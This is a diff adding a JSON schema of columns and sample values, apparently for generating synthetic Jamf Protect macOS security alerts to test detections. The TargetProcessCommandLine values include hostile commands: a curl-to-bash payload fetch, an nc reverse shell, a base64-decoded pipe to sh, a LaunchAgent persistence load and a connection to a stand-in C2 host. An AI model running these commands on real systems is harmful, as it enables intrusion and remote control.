@@ -1,0 +1,525 @@
+{
+  "columns": [
+    {
+      "name": "TimeGenerated",
+      "type": "datetime"
+    },
+    {
+      "name": "EventVendor",
+      "type": "string",
+      "values": [
+        "Jamf"
+      ]
+    },
+    {
+      "name": "EventProduct",
+      "type": "string",
+      "values": [
+        "Alerts Stream"
+      ]
+    },
+    {
+      "name": "EventProductVersion",
+      "type": "string",
+      "values": [
+        "5.0.0",
+        "5.1.0",
+        "5.2.0"
+      ]
+    },
+    {
+      "name": "EventSeverity",
+      "type": "string",
+      "values": [
+        "Informational",
+        "Low",
+        "Medium",
+        "High"
+      ]
+    },
+    {
+      "name": "EventOriginalType",
+      "type": "string",
+      "values": [
+        "GPClickEvent",
+        "GPDownloadEvent",
+        "GPFSEvent",
+        "GPProcessEvent",
+        "GPKeylogRegisterEvent",
+        "GPGatekeeperEvent",
+        "GPMRTEvent",
+        "GPPreventedExecutionEvent",
+        "GPThreatMatchExecEvent",
+        "GPUnifiedLogEvent",
+        "GPUSBEvent",
+        "auth-mount"
+      ]
+    },
+    {
+      "name": "EventOriginalUid",
+      "type": "string"
+    },
+    {
+      "name": "EventType",
+      "type": "string",
+      "values": [
+        "Click",
+        "Download",
+        "FileSystem",
+        "Process",
+        "Keylog",
+        "Gatekeeper",
+        "MRT",
+        "ProcessDenied",
+        "ProcessPrevented",
+        "UnifiedLog",
+        "USB",
+        "UsbBlock"
+      ]
+    },
+    {
+      "name": "EventResult",
+      "type": "string",
+      "values": [
+        "Allowed",
+        "Prevented"
+      ]
+    },
+    {
+      "name": "EventMessage",
+      "type": "string",
+      "values": [
+        "XProtect signature match",
+        "Suspicious AppleScript invocation",
+        "Unsigned binary execution",
+        "USB mass storage attached",
+        "Gatekeeper bypass attempt",
+        "Persistence via LaunchAgent",
+        "Keylogger registration detected",
+        "Process injection observed",
+        "Browser data access",
+        "Office macro spawn",
+        "TCC database access",
+        "Crypto miner indicator"
+      ]
+    },
+    {
+      "name": "EventResultMessage",
+      "type": "string",
+      "values": [
+        "XProtect blocked known malware signature",
+        "AppleScript used to run shell commands",
+        "Unsigned binary attempted to execute",
+        "USB storage device was connected",
+        "Gatekeeper check failed for quarantined file",
+        "LaunchAgent plist written to persistence path",
+        "Suspicious keylogger API registration detected",
+        "Code injection via task_for_pid observed",
+        "Application accessed sensitive browser data",
+        "Microsoft Office spawned shell interpreter",
+        "TCC-protected database accessed without consent",
+        "Crypto mining process indicators detected"
+      ]
+    },
+    {
+      "name": "EventCount",
+      "type": "int"
+    },
+    {
+      "name": "TargetHostname",
+      "type": "string",
+      "values": [
+        "jdoe-mbp.contoso.local",
+        "asmith-macstudio.contoso.local",
+        "finance-imac-01.contoso.local",
+        "fin-mbp-finance.contoso.local",
+        "dev-mbp-eng-01.contoso.local",
+        "ceo-mbp.contoso.local",
+        "prod-mac-build-01.contoso.local",
+        "vip-mbp-legal.contoso.local",
+        "intern-mbp-01.contoso.local",
+        "mkt-mbp-02.contoso.local"
+      ]
+    },
+    {
+      "name": "DvcHostname",
+      "type": "string",
+      "values": [
+        "jdoe-mbp.contoso.local",
+        "asmith-macstudio.contoso.local",
+        "finance-imac-01.contoso.local",
+        "fin-mbp-finance.contoso.local",
+        "dev-mbp-eng-01.contoso.local",
+        "ceo-mbp.contoso.local",
+        "prod-mac-build-01.contoso.local",
+        "vip-mbp-legal.contoso.local",
+        "intern-mbp-01.contoso.local",
+        "mkt-mbp-02.contoso.local"
+      ]
+    },
+    {
+      "name": "DvcSerial",
+      "type": "string",
+      "values": [
+        "C02XF1JLJG5J",
+        "C02ZN1ABCDEF",
+        "C02G1234XYZ9",
+        "C02DK4567ABC"
+      ]
+    },
+    {
+      "name": "DvcIpAddr",
+      "type": "string",
+      "values": [
+        "10.4.2.18",
+        "10.4.2.39",
+        "10.6.1.10",
+        "192.168.1.42"
+      ]
+    },
+    {
+      "name": "DvcId",
+      "type": "string"
+    },
+    {
+      "name": "DvcOs",
+      "type": "string",
+      "values": [
+        "macOS"
+      ]
+    },
+    {
+      "name": "DvcOsVersion",
+      "type": "string",
+      "values": [
+        "macOS 13.6.1",
+        "macOS 14.2",
+        "macOS 14.4.1",
+        "macOS 15.0",
+        "macOS 15.1"
+      ]
+    },
+    {
+      "name": "SrcDeviceType",
+      "type": "string",
+      "values": [
+        "Computer"
+      ]
+    },
+    {
+      "name": "ProcessEventType",
+      "type": "string",
+      "values": [
+        "Create",
+        "Exit",
+        "None"
+      ]
+    },
+    {
+      "name": "ProcessEventSubType",
+      "type": "string",
+      "values": [
+        "Exec",
+        "Fork",
+        "Execve",
+        "Posix Spawn"
+      ]
+    },
+    {
+      "name": "ActingProcessName",
+      "type": "string",
+      "values": [
+        "osascript",
+        "python3",
+        "curl",
+        "bash",
+        "zsh",
+        "sh",
+        "launchd",
+        "sudo",
+        "ssh",
+        "scp",
+        "nc",
+        "openssl",
+        "Microsoft Word",
+        "Microsoft Excel",
+        "Google Chrome",
+        "Safari",
+        "Slack",
+        "Zoom",
+        "node",
+        "ruby",
+        "perl",
+        "Terminal",
+        "loginwindow",
+        "mdmclient"
+      ]
+    },
+    {
+      "name": "ActingProcessId",
+      "type": "int"
+    },
+    {
+      "name": "ActingProcessGuid",
+      "type": "string"
+    },
+    {
+      "name": "ParentProcessName",
+      "type": "string",
+      "values": [
+        "launchd",
+        "bash",
+        "zsh",
+        "sh",
+        "Terminal",
+        "loginwindow",
+        "Finder",
+        "osascript",
+        "python3",
+        "sudo",
+        "mdmclient",
+        "SpringBoard"
+      ]
+    },
+    {
+      "name": "ParentProcessId",
+      "type": "int"
+    },
+    {
+      "name": "ParentProcessGuid",
+      "type": "string"
+    },
+    {
+      "name": "TargetProcessName",
+      "type": "string",
+      "values": [
+        "osascript",
+        "python3",
+        "curl",
+        "bash",
+        "zsh",
+        "sh",
+        "launchd",
+        "sudo",
+        "ssh",
+        "scp",
+        "nc",
+        "openssl",
+        "Microsoft Word",
+        "Microsoft Excel",
+        "Google Chrome",
+        "Safari",
+        "Slack",
+        "Zoom",
+        "node",
+        "ruby",
+        "perl",
+        "Terminal",
+        "loginwindow",
+        "mdmclient"
+      ]
+    },
+    {
+      "name": "TargetProcessId",
+      "type": "int"
+    },
+    {
+      "name": "TargetProcessGuid",
+      "type": "string"
+    },
+    {
+      "name": "TargetProcessSHA256",
+      "type": "string"
+    },
+    {
+      "name": "TargetProcessSHA1",
+      "type": "string"
+    },
+    {
+      "name": "TargetProcessCommandLine",
+      "type": "string",
+      "values": [
+        "osascript -e 'do shell script \"whoami\"'",
+        "curl -fsSL http://malicious.example.com/payload.sh | bash",
+        "python3 -c 'import os; os.system(\"id\")'",
+        "bash -c 'echo dGVzdA== | base64 -d | sh'",
+        "sh /tmp/payload.sh",
+        "sudo launchctl load /Library/LaunchAgents/com.evil.plist",
+        "nc -e /bin/bash 10.0.0.99 4444",
+        "openssl s_client -connect c2.example.com:443"
+      ]
+    },
+    {
+      "name": "TargetProcessCurrentDirectory",
+      "type": "string",
+      "values": [
+        "/usr/bin",
+        "/usr/local/bin",
+        "/tmp",
+        "/var/folders/zz",
+        "/Applications/Microsoft Word.app/Contents/MacOS",
+        "/Users/jdoe/Downloads",
+        "/Library/LaunchAgents",
+        "/private/tmp"
+      ]
+    },
+    {
+      "name": "TargetProcessStatusCode",
+      "type": "int"
+    },
+    {
+      "name": "TargetFilePath",
+      "type": "string",
+      "values": [
+        "/tmp/payload.dylib",
+        "/Users/jdoe/Downloads/installer.dmg",
+        "/Library/LaunchAgents/com.evil.persist.plist",
+        "/Applications/Bad App.app/Contents/MacOS/badbin",
+        "/Users/asmith/Documents/macro-doc.docm",
+        "/tmp/.hidden",
+        "/private/var/folders/zz/zyxwvuts/T/payload.sh",
+        "/Users/ceo/Downloads/Invoice.app"
+      ]
+    },
+    {
+      "name": "TargetFileSHA256",
+      "type": "string"
+    },
+    {
+      "name": "TargetFileSHA1",
+      "type": "string"
+    },
+    {
+      "name": "TargetFileSize",
+      "type": "int",
+      "values": [
+        "1024",
+        "8192",
+        "65536",
+        "524288",
+        "2097152",
+        "16777216",
+        "134217728"
+      ]
+    },
+    {
+      "name": "TargetFileSignerType",
+      "type": "string",
+      "values": [
+        "Apple",
+        "App Store",
+        "Developer",
+        "Ad Hoc",
+        "Unsigned"
+      ]
+    },
+    {
+      "name": "TargetFileSigningTeamID",
+      "type": "string",
+      "values": [
+        "APPLE0COMP",
+        "ABCDE12345",
+        "XYZW987654",
+        "DEADBEEF99",
+        "(unsigned)"
+      ]
+    },
+    {
+      "name": "TargetFileSigningInfoMessage",
+      "type": "string",
+      "values": [
+        "Signed by Apple Developer",
+        "Valid Developer ID",
+        "Notarized",
+        "Unsigned binary",
+        "Ad-hoc signed"
+      ]
+    },
+    {
+      "name": "TargetFileIsDownload",
+      "type": "boolean"
+    },
+    {
+      "name": "TargetFileIsAppBundle",
+      "type": "boolean"
+    },
+    {
+      "name": "TargetFileIsDirectory",
+      "type": "boolean"
+    },
+    {
+      "name": "TargetFileIsScreenshot",
+      "type": "boolean"
+    },
+    {
+      "name": "TargetBinaryFilePath",
+      "type": "string",
+      "values": [
+        "/usr/bin/curl",
+        "/usr/bin/python3",
+        "/bin/bash",
+        "/usr/bin/osascript",
+        "/usr/bin/nc",
+        "/usr/bin/openssl",
+        "/usr/local/bin/node",
+        "/tmp/implant",
+        "/var/folders/zz/badlib.dylib",
+        "/Applications/Bad App.app/Contents/MacOS/badbin"
+      ]
+    },
+    {
+      "name": "TargetBinarySHA256",
+      "type": "string"
+    },
+    {
+      "name": "TargetBinarySHA1",
+      "type": "string"
+    },
+    {
+      "name": "TargetBinarySigningInfoMessage",
+      "type": "string",
+      "values": [
+        "Signed by Apple Developer",
+        "Valid Developer ID",
+        "Notarized",
+        "Unsigned binary",
+        "Ad-hoc signed"
+      ]
+    },
+    {
+      "name": "TargetbinarySignerType",
+      "type": "string",
+      "values": [
+        "Apple",
+        "App Store",
+        "Developer",
+        "Ad Hoc",
+        "Unsigned"
+      ]
+    },
+    {
+      "name": "TargetBinarySigningTeamID",
+      "type": "string",
+      "values": [
+        "APPLE0COMP",
+        "ABCDE12345",
+        "XYZW987654",
+        "DEADBEEF99",
+        "(unsigned)"
+      ]
+    },
+    {
+      "name": "TargetBinarySigningAppID",
+      "type": "string",
+      "values": [
+        "com.apple.curl",
+        "com.apple.python3",
+        "com.apple.bash",
+        "com.apple.osascript",
+        "(unsigned)",
+        "com.evil.payload",
+        "com.unknowndev.app"
+      ]
+    }
+  ]
+}
